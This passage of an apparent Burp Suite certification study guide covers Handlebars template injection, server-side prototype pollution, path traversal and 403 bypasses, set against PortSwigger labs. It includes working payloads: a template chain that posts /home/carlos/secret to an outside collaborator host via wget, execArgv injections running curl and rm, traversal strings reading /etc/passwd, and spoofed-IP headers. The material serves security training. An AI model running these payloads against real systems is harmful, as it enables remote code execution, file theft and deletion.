src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/erb-template.png\" alt=\"ERB template\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic\" rel=\"nofollow\"\u003ePortSwigger Lab: Basic server-side template injection\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eHandlebars\u003c/h3\u003e\u003ca id=\"user-content-handlebars\" class=\"anchor\" aria-label=\"Permalink: Handlebars\" href=\"#handlebars\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eHandlebars Template can be identified by injecting below set of characters and not encoding them into the \u003ccode\u003eGET /?message=Unfortunately this product is out of stock\u003c/code\u003e parameter. \u003ca href=\"https://github.com/vladko312/SSTImap\"\u003eSSTIMAP\u003c/a\u003e was not able to identify this handlebars SSTI vulnerability.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003eUse fuzzer payload to produce error message that \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e handlebars template engine.\u003c/p\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"fuzzer${{\u0026lt;%[%'\u0026quot;}}%\\,\u0026lt;\u0026gt;\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003efuzzer${{\u0026lt;%[%'\"}}%\\,\u0026lt;\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/identified-ssti-handlebars.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/identified-ssti-handlebars.png\" alt=\"identified-ssti-handlebars.png\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://www.urlencoder.org/\" rel=\"nofollow\"\u003eURL encoding\u003c/a\u003e the payload, it is not required to remove newline breaks or spaces. The payload will send the contents of \u003ccode\u003e/home/carlos/secret\u003c/code\u003e to Burp Collaborator.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"wrtz{{#with \u0026quot;s\u0026quot; as |string|}}\n    {{#with \u0026quot;e\u0026quot;}}\n        {{#with split as |conslist|}}\n            {{this.pop}}\n            {{this.push (lookup string.sub \u0026quot;constructor\u0026quot;)}}\n            {{this.pop}}\n            {{#with string.split as |codelist|}}\n                {{this.pop}}\n                {{this.push \u0026quot;return require('child_process').exec('wget https://OASTIFY.COM --post-file=/home/carlos/secret');\u0026quot;}}\n                {{this.pop}}\n                {{#each conslist}}\n                    {{#with (string.sub.apply 0 codelist)}}\n                        {{this}}\n                    {{/with}}\n                {{/each}}\n            {{/with}}\n        {{/with}}\n    {{/with}}\n{{/with}}\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003ewrtz{{#with \"s\" as |string|}}\n    {{#with \"e\"}}\n        {{#with split as |conslist|}}\n            {{this.pop}}\n            {{this.push (lookup string.sub \"constructor\")}}\n            {{this.pop}}\n            {{#with string.split as |codelist|}}\n                {{this.pop}}\n                {{this.push \"return require('child_process').exec('wget https://OASTIFY.COM --post-file=/home/carlos/secret');\"}}\n                {{this.pop}}\n                {{#each conslist}}\n                    {{#with (string.sub.apply 0 codelist)}}\n                        {{this}}\n                    {{/with}}\n                {{/each}}\n            {{/with}}\n        {{/with}}\n    {{/with}}\n{{/with}}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/handlebars-template.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/handlebars-template.png\" alt=\"Handlebars template\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit\" rel=\"nofollow\"\u003ePortSwigger Lab: Server-side template injection in an unknown language\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/research/server-side-template-injection\" rel=\"nofollow\"\u003ePortSwigger Research SSTI\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eNote: \u003cem\u003e\u003cstrong\u003eIdentify\u003c/strong\u003e\u003c/em\u003e the Update forgot email template message under the admin_panel at the path /update_forgot_email.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003chr\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eSSPP - Server Side Prototype Pollution\u003c/h2\u003e\u003ca id=\"user-content-sspp---server-side-prototype-pollution\" class=\"anchor\" aria-label=\"Permalink: SSPP - Server Side Prototype Pollution\" href=\"#sspp---server-side-prototype-pollution\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThe application run \u003ccode\u003eNode.js\u003c/code\u003e and the Express framework. It is vulnerable to server-side prototype pollution (SSPP) because it unsafely merges user-controllable input into a server-side JavaScript object.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eSSPP Exploit steps:\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003col dir=\"auto\"\u003e\n\u003cli\u003eFind a prototype pollution source that you can use to add arbitrary properties to the global Object.prototype.\u003c/li\u003e\n\u003cli\u003eIdentify a gadget that you can use to inject and execute arbitrary system commands.\u003c/li\u003e\n\u003cli\u003eTrigger remote execution of a command that deletes the file /home/carlos/morale.txt.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003cem\u003e\u003cstrong\u003eIdentify\u003c/strong\u003e\u003c/em\u003e prototype pollution\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-json notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026quot;__proto__\u0026quot;: {\n    \u0026quot;json spaces\u0026quot;:10\n}\"\u003e\u003cpre\u003e\u003cspan class=\"pl-ent\"\u003e\"__proto__\"\u003c/span\u003e: {\n    \u003cspan class=\"pl-ent\"\u003e\"json spaces\"\u003c/span\u003e:\u003cspan class=\"pl-c1\"\u003e10\u003c/span\u003e\n}\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eTest for remote code execution (RCE) by performing DNS request from back-end.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-json notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026quot;__proto__\u0026quot;: {\n    \u0026quot;execArgv\u0026quot;:[\n        \u0026quot;--eval=require('child_process').execSync('curl https://OASTIFY.COM')\u0026quot;\n    ]\n}\"\u003e\u003cpre\u003e\u003cspan class=\"pl-ent\"\u003e\"__proto__\"\u003c/span\u003e: {\n    \u003cspan class=\"pl-ent\"\u003e\"execArgv\"\u003c/span\u003e:[\n        \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e--eval=require('child_process').execSync('curl https://OASTIFY.COM')\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n    ]\n}\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eInject exploit in to read or delete user sensitive data. After injection, trigger new spawned node child processes, by using admin panel maintenance jobs button. This will action on Carlos \u003ccode\u003esecret\u003c/code\u003e file.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-json notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026quot;__proto__\u0026quot;: {\n    \u0026quot;execArgv\u0026quot;:[\n        \u0026quot;--eval=require('child_process').execSync('rm /home/carlos/morale.txt')\u0026quot;\n    ]\n}\"\u003e\u003cpre\u003e\u003cspan class=\"pl-ent\"\u003e\"__proto__\"\u003c/span\u003e: {\n    \u003cspan class=\"pl-ent\"\u003e\"execArgv\"\u003c/span\u003e:[\n        \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e--eval=require('child_process').execSync('rm /home/carlos/morale.txt')\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n    ]\n}\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/sspp.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/sspp.png\" alt=\"SSPP JSON injection\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/prototype-pollution/server-side/lab-remote-code-execution-via-server-side-prototype-pollution\" rel=\"nofollow\"\u003ePortSwigger Lab: Remote code execution via server-side prototype pollution\u003c/a\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eFile Path Traversal\u003c/h2\u003e\u003ca id=\"user-content-file-path-traversal\" class=\"anchor\" aria-label=\"Permalink: File Path Traversal\" href=\"#file-path-traversal\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://github.com/botesjuan/cpts-quick-references/blob/main/module/File%20Inclusions.md\"\u003eHackTheBox CPTS File Inclusion\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#lfi-attacks\"\u003eLFI Attacks\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#admin-portal-files\"\u003eAdmin Portal Files\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#path-traversal-authz\"\u003ePath Traversal Authz\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eLFI attacks\u003c/h3\u003e\u003ca id=\"user-content-lfi-attacks\" class=\"anchor\" aria-label=\"Permalink: LFI attacks\" href=\"#lfi-attacks\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://youtu.be/XhieEh9BlGc\" rel=\"nofollow\"\u003eRana Khalil Directory traversal training\u003c/a\u003e demo show the attacks that allow the malicious actor to read file on the server.\u003cbr\u003e\n\u003cem\u003e\u003cstrong\u003eIdentify\u003c/strong\u003e\u003c/em\u003e web parameters such as \u003ccode\u003efilename=\u003c/code\u003e that are requesting files from target.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003col dir=\"auto\"\u003e\n\u003cli\u003eApplication blocks traversal sequences but treats the supplied filename as being relative to a absolute path and can be exploit with \u003ccode\u003e/etc/passwd\u003c/code\u003eabsolute path to target file payload.\u003c/li\u003e\n\u003cli\u003eImages on target is loaded using \u003ccode\u003efilename\u003c/code\u003e parameter, and is defending against traversal attacks by stripping path traversal. Exploit using \u003ccode\u003e....//....//....//....//etc/passwd\u003c/code\u003e payloads.\u003c/li\u003e\n\u003cli\u003eSuperfluous URL-encoded \u003ccode\u003e..%252f..%252f..%252fetc/passwd\u003c/code\u003e payload can bypass application security controls.\u003c/li\u003e\n\u003cli\u003eLeading the beginning of the filename referenced with the original path and then appending \u003ccode\u003e/var/www/images/../../../etc/passwd\u003c/code\u003e payload at end bypasses the protection.\u003c/li\u003e\n\u003cli\u003eUsing a \u003cstrong\u003enull\u003c/strong\u003e byte character at end plus an image extension to fool APP controls that an image is requested, this \u003ccode\u003e../../../etc/passwd%00.png\u003c/code\u003e payload succeed.\u003c/li\u003e\n\u003cli\u003eDouble URL encode file path traversal, as example this \u003ccode\u003e../../../../../../../../../../etc/hostname\u003c/code\u003e will be URL double encoded as, \u003ccode\u003e%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fhostname\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eWindows OS accept both \u003ccode\u003e../\u003c/code\u003e and \u003ccode\u003e..\\\u003c/code\u003e for directory traversal syntax, and as example retrieving \u003ccode\u003eloadImage?filename=..\\..\\..\\windows\\win.ini\u003c/code\u003e on windows target to \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e valid path traversal.\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/botesjuan/cpts-quick-references/blob/main/module/File%20Inclusions.md#remote-code-execution\"\u003ePHP Wrapper, expect \u0026amp; filter\u003c/a\u003e pose vulnerability that allow traversal bypass to result in remote code execution (RCE) critical. Using \u003ca href=\"https://github.com/synacktiv/php_filter_chain_generator\"\u003ePHP filter chain generator\u003c/a\u003e to get your RCE without uploading a file if you control entirely the parameter passed to a require or an include in PHP! See \u003ca href=\"https://youtu.be/OGjpTT6xiFI?t=1019\" rel=\"nofollow\"\u003eTib3rius YouTube demo\u003c/a\u003e \u003ccode\u003epython php_filter_chain.generator.py --chain '\u0026lt;?=`$_GET[0]`; ?\u0026gt;' | tail -n 1 | urlencode\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e..%2f\u003c/code\u003e is also basic dot dot Forward Slash file path traversal obfuscation technique payload \u003ccode\u003e..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd\u003c/code\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eCorresponding PortSwigger Directory traversal labs.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003col dir=\"auto\"\u003e\n\u003cli\u003e\u003ca href=\"https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass\" rel=\"nofollow\"\u003ePortSwigger Lab: File path traversal, traversal sequences blocked with absolute path bypass\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively\" rel=\"nofollow\"\u003ePortSwigger Lab: File path traversal, traversal sequences stripped non-recursively\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode\" rel=\"nofollow\"\u003ePortSwigger Lab: File path traversal, traversal sequences stripped with superfluous URL-decode\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path\" rel=\"nofollow\"\u003ePortSwigger Lab: File path traversal, validation of start of path\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass\" rel=\"nofollow\"\u003ePortSwigger Lab: File path traversal, validation of file extension with null byte bypass\u003c/a\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/file-path-traversal-null-byte.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/file-path-traversal-null-byte.png\" alt=\"file-path-traversal-null-byte.png\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eBSCP Exam challenge \u003cem\u003e\u003cstrong\u003eidentified\u003c/strong\u003e\u003c/em\u003e, after obtaining admin session access, you can read \u003ccode\u003e/etc/passwd\u003c/code\u003e and \u003ccode\u003e/etc/hostname\u003c/code\u003e but as soon using same bypass file path traversal technique, the \u003ccode\u003ehome/carlos/secret\u003c/code\u003e give response \u003ccode\u003e403 Forbidden\u003c/code\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eAdmin Portal Files\u003c/h3\u003e\u003ca id=\"user-content-admin-portal-files\" class=\"anchor\" aria-label=\"Permalink: Admin Portal Files\" href=\"#admin-portal-files\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eOn the admin portal \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e that the images are loaded using \u003cstrong\u003eimagefile=\u003c/strong\u003e parameter. Test if vulnerable to directory traversal. The imagefile parameter is vulnerable to directory traversal path attacks, enabling read access to arbitrary files on the server.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"GET /admin_controls/metrics/admin-image?imagefile=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd\"\u003e\u003cpre\u003eGET /admin_controls/metrics/admin-image?imagefile=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eNote: Add the fuzzing path traversal payload from drop-down list option, \u003cem\u003e\u003cstrong\u003eAdd from list ...\u003c/strong\u003e\u003c/em\u003e. Then set processing rule on the provided payload to replace the FILE place holder with reg-ex \u003ccode\u003e\\{FILE\\}\u003c/code\u003e for each of the attacks.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/payloads-for-path-traverse.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/payloads-for-path-traverse.png\" alt=\"payloads for path traverse\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eBurp Intruder provides a predefined payload list, as example \u003cstrong\u003e\"Fuzzing - path traversal\"\u003c/strong\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/file-path-traversal\" rel=\"nofollow\"\u003ePortSwigger Academy File-path-traversal\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://www.geeksforgeeks.org/403bypasser-bypass-403-restricted-directory/\" rel=\"nofollow\"\u003e403bypasser\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"python3 403bypasser.py -u https://TARGET.net -d /secret\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003epython3 403bypasser.py -u https://TARGET.net -d /secret\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003ePath Traversal Authz\u003c/h3\u003e\u003ca id=\"user-content-path-traversal-authz\" class=\"anchor\" aria-label=\"Permalink: Path Traversal Authz\" href=\"#path-traversal-authz\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eAdding Headers in request with value \u003ccode\u003e127.0.0.1\u003c/code\u003e or \u003ccode\u003elocalhost\u003c/code\u003e can also help in bypassing restrictions.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"X-Custom-IP-Authorization: 127.0.0.1\nX-Forwarded-For: localhost\nX-Forward-For: localhost\nX-Remote-IP: localhost\nX-Client-IP: localhost\nX-Real-IP: localhost\n\nX-Originating-IP: 127.0.0.1\nX-Forwarded: 127.0.0.1\nForwarded-For: 127.0.0.1\nX-Remote-Addr: 127.0.0.1\nX-ProxyUser-Ip: 127.0.0.1\nX-Original-URL: 127.0.0.1\nClient-IP: 127.0.0.1\nTrue-Client-IP: 127.0.0.1\nCluster-Client-IP: 127.0.0.1\nX-ProxyUser-Ip: 127.0.0.1\"\u003e\u003cpre\u003eX-Custom-IP-Authorization: 127.0.0.1\nX-Forwarded-For: localhost\nX-Forward-For: localhost\nX-Remote-IP: localhost\nX-Client-IP: localhost\nX-Real-IP: localhost\n\nX-Originating-IP: 127.0.0.1\nX-Forwarded: 127.0.0.1\nForwarded-For: 127.0.0.1\nX-Remote-Addr: 127.0.0.1\nX-ProxyUser-Ip: 127.0.0.1\nX-Original-URL: 127.0.0.1\nClient-IP: 127.0.0.1\nTrue-Client-IP: 127.0.0.1\nCluster-Client-IP: 127.0.0.1\nX-ProxyUser-Ip: 127.0.0.1\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/403-and-401-bypasses\" rel=\"nofollow\"\u003eHackTricks Bypass 403 Forbidden paths\u003c/a\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eFile Uploads\u003c/h2\u003e\u003ca id=\"user-content-file-uploads\" class=\"anchor\" aria-label=\"Permalink: File Uploads\" href=\"#file-uploads\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 